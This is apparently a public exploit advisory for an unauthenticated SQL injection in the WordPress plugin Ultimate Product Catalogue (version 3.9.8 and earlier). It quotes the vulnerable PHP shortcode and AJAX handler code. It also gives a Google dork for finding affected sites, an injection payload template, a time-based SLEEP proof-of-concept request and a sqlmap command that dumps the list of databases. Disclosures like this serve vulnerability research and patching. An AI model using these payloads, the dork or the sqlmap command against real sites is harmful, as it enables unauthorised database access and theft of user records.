# Date: 2016-07-28
# Google Dork: "Index of /wp-content/plugins/ultimate-product-catalogue/"
# Exploit Author: Joaquin Ramirez Martinez [ i0 SEC-LABORATORY ]
# Vendor Homepage: http://www.EtoileWebDesign.com/
# plugin uri: http://www.EtoileWebDesign.com/ultimate-product-catalogue/
# Software Link: 
# Version: <=3.9.8
# Tested on: windows 7 + firefox. 
 
====================
 DESCRIPTION
====================
 
Due to a unsanitized parameters passed to the shorcode function `Insert_Product_Catalog`  [ "product-catalogue" ]
located in `/Funtions/Shortcodes.php` line 4:
 
function Insert_Product_Catalog($atts) {    
    // Select the catalogue information from the database
    ...
 
    $Catalogue = $wpdb->get_row("SELECT * FROM $catalogues_table_name WHERE Catalogue_ID=" . $id);
    $CatalogueItems = $wpdb->get_results("SELECT * FROM $catalogue_items_table_name WHERE Catalogue_ID=" . $id . " ORDER BY Position");
    ...
     
    return $ProductString;
}
 
The $id parameter is extracted with `extract` function from $atts. This is a vulnerability with which can be exploited by creating  shortcodes with 
malicious attributes, exploitable only by administrators, editors, authors. But in file `/Functions/Process_Ajax.php`  line 113...
 
function UPCP_Filter_Catalogue() {
    $Path = ABSPATH . &#039;wp-load.php&#039;;
    include_once($Path);
     
    $id = $_POST[&#039;id&#039;]; <-- we can control this value!!
 
    ...
     
    echo do_shortcode("[product-catalogue id=&#039;" . $id . "&#039; only_inner=&#039;Yes&#039; starting_layout=&#039;" . $start_layout . "&#039; excluded_layouts=&#039;" . $exclude_layouts . "&#039; current_page=&#039;" . $current_page . "&#039; ajax_reload=&#039;" . $ajax_reload . "&#039; ajax_url=&#039;" . $ajax_url . "&#039; request_count=&#039;" . $request_count . "&#039; category=&#039;" . $Category . "&#039; subcategory=&#039;" . $SubCategory . "&#039; tags=&#039;" . $Tags . "&#039; custom_fields=&#039;" . $Custom_Fields . "&#039; prod_name=&#039;" . $Prod_Name . "&#039; min_price=&#039;" . $Min_Price . "&#039; max_price=&#039;" . $Max_Price . "&#039;]");
}
 
 
This is interesting because that function calls `do_shortcode` executing the shortcode &#039;product-catalogue&#039; as a result, this calls `Insert_Product_Catalog` wich 
I found the SQLi, now we need to found a place where ` UPCP_Filter_Catalogue` is called and in line 138-139 i found...
 
...
add_action(&#039;wp_ajax_update_catalogue&#039;, &#039;UPCP_Filter_Catalogue&#039;);
add_action( &#039;wp_ajax_nopriv_update_catalogue&#039;, &#039;UPCP_Filter_Catalogue&#039;);
...
 
this means that we can execute that function only with a request to `/wp-admin/admin-ajax.php?action=update_catalogue` and send the vulnerable $id parameter
 
Example:
 
http://<wp-host>/<wp-path>/wp-admin/admin-ajax.php?action=update_catalogue
 
POSTDATA: id=0+or+(our+custom+select+here)+--
 
 
An attacker can exploit this vulnerability and compromise all user records or take over control of the host machine.
 
==============
 POC
==============
-----------------
//REQUEST
------------------
 
Host: localhost
Content-Length: 21
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: es-ES,es;q=0.8
Cookie: 
 
id=1+OR+SLEEP(10)+--+
 
--------------------------
 EXPLOITING WITH SQLMAP
------------------------
 
sqlmap --url="http://<wp-host>/<wp-path>/wp-admin/admin-ajax.php?action=update_catalogue" --data="id=1" --level=5 --risk=3 --technique=B  -p id --dbs --dbms=mysql
 
(listing all available databases)
 
 
==================================
time-line
===================================
 
2016-07-28: reported to vendor.
2016-07-29: public disclousure.
===================================

